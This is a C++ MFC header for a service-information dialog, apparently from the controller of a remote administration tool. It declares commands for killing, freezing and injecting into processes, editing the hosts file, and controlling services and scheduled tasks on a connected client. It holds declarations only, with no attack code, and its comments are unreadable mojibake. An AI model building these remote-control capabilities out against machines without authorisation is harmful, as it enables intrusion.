#pragma once
#include "MachineDlg.h"

/////////////////////////////////////////////////////////////////////////////
// CServiceInfoDlg dialog


enum MACHINE
{

	COMMAND_MACHINE_PROCESS,
	COMMAND_MACHINE_WINDOWS,
	COMMAND_MACHINE_NETSTATE,
	COMMAND_MACHINE_SOFTWARE,
	COMMAND_MACHINE_HTML,
	COMMAND_MACHINE_FAVORITES,
	COMMAND_MACHINE_WIN32SERVICE,
	COMMAND_MACHINE_DRIVERSERVICE,
	COMMAND_MACHINE_TASK,
	COMMAND_MACHINE_HOSTS, //���������



	COMMAND_APPUNINSTALL,//ж��
	COMMAND_WINDOW_OPERATE,//���ڿ���
	COMMAND_WINDOW_CLOSE,//�ر�
	COMMAND_PROCESS_KILL,//��������
	COMMAND_PROCESS_KILLDEL,//��������----ɾ��
	COMMAND_PROCESS_DEL,//ǿ��ɾ�� ����Ҫ��������
	COMMAND_PROCESS_FREEZING,//����	
	COMMAND_PROCESS_THAW,//�ⶳ
	COMMAND_HOSTS_SET,//hosts

	COMMAND_SERVICE_LIST_WIN32,
	COMMAND_SERVICE_LIST_DRIVER,
	COMMAND_DELETESERVERICE,
	COMMAND_STARTSERVERICE,
	COMMAND_STOPSERVERICE,
	COMMAND_PAUSESERVERICE,
	COMMAND_CONTINUESERVERICE,

	COMMAND_TASKCREAT,				
	COMMAND_TASKDEL,
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_INJECT,

	TOKEN_MACHINE_PROCESS,
	TOKEN_MACHINE_WINDOWS,
	TOKEN_MACHINE_NETSTATE,
	TOKEN_MACHINE_SOFTWARE,
	TOKEN_MACHINE_HTML,
	TOKEN_MACHINE_FAVORITES,
	TOKEN_MACHINE_WIN32SERVICE,
	TOKEN_MACHINE_DRIVERSERVICE,
	TOKEN_MACHINE_HOSTS,
	TOKEN_MACHINE_SERVICE_LIST,
	TOKEN_MACHINE_TASKLIST,

	TOKEN_MACHINE_MSG,
};











typedef struct
{
	CString strSerName;
	CString strSerDisPlayname;
	CString strSerDescription;
	CString strFilePath;
	CString strSerRunway;
	CString strSerState;
}SERVICEINFO;

class CServiceInfoDlg : public CDialog
{
	// Construction
public:
	CServiceInfoDlg(CWnd* pParent = NULL);   // standard constructor

	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	// Dialog Data
		//{{AFX_DATA(CServiceInfoDlg)
	enum { IDD = IDD_SERVICE_INFO };
	CComboBox	m_combox_runway;
	//}}AFX_DATA

	SERVICEINFO m_ServiceInfo;
	CMachineDlg* m_MachineDlg;

	// Overrides
		// ClassWizard generated virtual function overrides
		//{{AFX_VIRTUAL(CServiceInfoDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
// Implementation
protected:
	HICON m_hIcon;
	void SendToken(BYTE bToken);

	// Generated message map functions
	//{{AFX_MSG(CServiceInfoDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSelchangeComboRunway();
	afx_msg void OnButtonStart();
	afx_msg void OnButtonStop();
	afx_msg void OnButtonPause();
	afx_msg void OnButtonContinue();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};
